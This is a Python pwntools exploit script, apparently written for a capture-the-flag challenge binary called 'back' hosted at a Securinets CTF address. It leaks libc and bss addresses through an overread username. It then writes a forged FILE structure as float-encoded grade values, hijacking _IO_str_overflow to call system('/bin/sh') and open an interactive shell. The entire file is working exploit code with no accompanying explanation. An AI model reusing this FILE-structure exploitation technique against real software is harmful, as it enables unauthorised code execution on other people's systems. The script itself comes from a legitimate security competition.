#!/usr/bin/python

from pwn import *
import sys
import struct

remote_ip, port = 'bin.q21.ctfsecurinets.com', 1340
binary = './back'
brkpts = '''
b system
b _IO_str_overflow
'''

elf = ELF("back")
libc = ELF("libc.so.6")

context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def ud(i):
    return "%.50f" % struct.unpack('>f', p32(i, endian='big'))[0]

def getupper(val):
    return (val >> 32) & 0xffffffff

def getlower(val):
    return val & 0xffffffff

if __name__=="__main__":
    sa("username: ",'a'*16)
    reu("a"*16)
    libc.address = u64(re(6) + '\x00'*2) - 0x3e82a0
    log.success("libc = " + hex(libc.address))
    system = libc.symbols['system']
    binsh = next(libc.search("/bin/sh"))
    ptr = libc.symbols['_IO_file_jumps'] + 0xd8 - 0x10
    log.info("pointer = " + hex(ptr))

    sa("username: ",'a'*64)
    reu('a'*64)
    bss = u64(re(6) + '\x00'*2) + 0x200f70
    log.success("bss = " + hex(bss))
    sa("username: ",'\n')
    sla("Provide number of subjects: ",str(64))
    vals = [
        0xfbad8884,
        0,
        0,
        0,
        0,
        (binsh - 100) / 2,
        0,
        0,
        (binsh - 100) / 2,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        bss + 0x170,
        0, 
        0,
        0, 
        0,
        0, 
        0,
        0, 
        0,
        0,
        ptr
    ]
    #gdb.attach(io, brkpts)
    for idx, i in enumerate(vals):
        sla("grade: ",ud(getlower(i)))
        sla("grade: ",ud(getupper(i)))

    for i in range(3):  
        sla("grade: ",ud(getlower(system)))
        sla("grade: ",ud(getupper(system)))

    sla("grade: ",ud(getlower(bss + 0x60)))
    sla("grade: ",ud(getupper(bss + 0x60)))
    sla("grade: ",ud(getlower(bss + 0x60)))

    io.interactive()
